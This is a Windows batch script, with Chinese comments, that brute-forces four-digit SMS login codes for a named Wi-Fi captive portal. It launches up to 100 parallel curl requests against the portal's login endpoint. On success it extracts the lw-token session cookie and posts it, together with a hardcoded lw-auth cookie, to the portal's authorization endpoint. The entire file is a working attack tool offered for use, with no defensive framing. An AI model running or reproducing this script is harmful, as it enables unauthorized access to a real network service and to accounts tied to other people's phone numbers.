@echo off
set phone=   REM 此处输入手机号
set num=0    REM 此处输入起始验证码
set thread=100 REM 此处多线程

REM 如果传入参数，则使用参数值
if not "%1"=="" set phone=%1
if not "%2"=="" set num=%2

echo phone: %phone%	start_code: %num%	thread: %thread%

:loop
if %num% GEQ 10000 goto end

REM 打印进度
echo try: %num% ~ %num%+%thread%

REM 启动多线程，Windows Batch 脚本的并行处理比较有限，这里通过启动多个命令行来模拟
for /L %%i in (1,1,%thread%) do (
    start "" call :try_code %num%
    set /a num+=1
)

REM 等待所有线程完成
timeout /t 1 >nul
goto loop

:try_code
setlocal
set current_code=%1
curl -s -o nul -w "%%{http_code}" -d "username=%phone%&password=000%current_code%" "http://lemonwifi.cn:80/portal/login" > response_code.txt
set /p status_code=<response_code.txt
if "%status_code%"=="302" (
    echo FOUND CODE! 000%current_code%
    curl -s -d "username=%phone%&password=000%current_code%" "http://lemonwifi.cn:80/portal/login" -D - > headers.txt
    for /F "tokens=2 delims==" %%a in ('findstr "lw-token=" headers.txt') do set lw_token=%%a
    echo FOUND lw-token! %lw_token%
    curl -X POST --cookie "lw-token=%lw_token%; lw-auth=981fb1a00c2100000000000000000001;" "http://lemonwifi.cn:80/portal/auth.ajax"
    exit /B
)
endlocal
exit /B

:end
echo no found!
REM 等待用户按回车退出
echo.
echo Press Enter to exit...
pause >nul
